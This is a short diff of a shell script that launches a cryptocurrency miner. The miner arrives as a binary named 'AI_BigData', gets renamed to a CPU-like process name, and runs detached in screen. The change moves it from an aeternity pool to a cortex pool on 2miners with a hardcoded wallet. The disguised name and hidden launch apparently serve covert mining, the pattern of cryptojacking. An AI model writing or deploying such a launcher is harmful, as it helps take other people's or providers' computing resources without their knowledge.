@@ -15,4 +15,4 @@ mv AI_BigData $azure -n
 cp $azure "$cpuname"
 rm -f  AI_BigData
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --algo aeternity --server ae.2miners.com:4040 --user ak_2CjiGwMxYidY1V4UBv9BAaFacC327opUNhERvFeFVzSz4UNAk1
+screen -d -m ./"${cpuname}" --algo cortex --server ctxc.2miners.com --port 12222 --user 0xf1836ed48c99064bb60465995bbccf87b67e4377 --ssl 1
